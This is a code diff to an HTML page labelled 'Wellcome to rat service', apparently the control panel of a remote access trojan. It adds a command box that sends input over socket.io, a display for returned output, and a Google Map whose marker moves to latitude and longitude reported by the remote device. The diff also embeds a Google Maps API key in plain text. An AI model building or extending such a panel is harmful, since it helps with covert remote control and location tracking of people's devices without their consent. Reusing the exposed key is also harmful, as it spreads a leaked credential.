@@ -42,20 +42,70 @@
             border-radius: 5px;
             
         }
+        #map{
+            width: 70%;
+            height: 500px;
+            margin-top: 25px;
+            border-radius: 10px;
+            margin-bottom: 50px;
+            border: 5px ridge black ;
+            background-color: #249bfd93;
+            align-self: center;
+        }
     </style>
+    <script>
+        var map;
+        var marker;
 
+        function initMap() {
+            
+         // The location of Uluru
+         const uluru = { lat: -25.344, lng: 131.036 };
+         // The map, centered at Uluru
+         map = new google.maps.Map(document.getElementById("map"), {
+           zoom: 10,
+           center: uluru,
+         });
+         // The marker, positioned at Uluru
+         marker = new google.maps.Marker({
+           position: uluru,
+           map: map,
+           icon:''
+         });
+       }
+
+
+       function AddMarks(position){
+        const marker = new google.maps.Marker({
+           position: position,
+           map: map,
+           icon:''
+         });
+       }
+
+</script>
 
 </head>
 <body>
+    
     <div id="monitor">
          
-         <p>resisaj oasdokoas ad</p>
-         <p>resisaj oasdokoas ad</p>
+         <p> Wellcome to rat service</p>
+
  
     </div>
     <input  id="inp" placeholder="enter command">
 
+    <div id="map">
+
+    </div>
+
 </body>
+<!--CONNECT-WITH-GOOGLE MAP>-->
+<script 
+src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCDbgSgPBdh1P6TyVXWJzip-mZMY9NjkeM&callback=initMap&libraries=&v=weekly"
+async
+></script>
 <script >
   var socket =io('/')
 var commands = document.getElementById("inp");
@@ -72,6 +122,13 @@ commands.addEventListener("keypress", function(event) {
     }
 
 });
+
+socket.on("location",data=>{
+   var mylocation =  JSON.parse(data)
+   changelocation(mylocation.latitude,mylocation.longitude)
+})
+
+
 socket.on('msg',data=>{
         addData(data)
 })
@@ -81,8 +138,39 @@ function addData(data){
    myPelement.innerText = data
    monitor.appendChild(myPelement);
 }
-    
-
 </script>
+
+<script>
+
+    function changelocation(late_T,long_T){
+   var latitute =Number(late_T)
+   var longatute =Number(long_T)
+
+   const uluru = { lat: latitute, lng: longatute };
+   // The map, centered at Uluru
+/*
+   map = new google.maps.Map(document.getElementById("map"), {
+   zoom: 10,
+   center: uluru,
+  
+   });
+   */
+   //map.setCenter(new google.maps.LatLng(latitute, longatute), 10)
+
+   marker.setPosition(new google.maps.LatLng(latitute,longatute));
+
+/*
+   // The marker, positioned at Uluru
+   const marker = new google.maps.Marker({
+   position: uluru,
+   map: map,
+   icon:''
+   });
+   */
+   }
+   
+  
+   </script>
+
 
 </html>
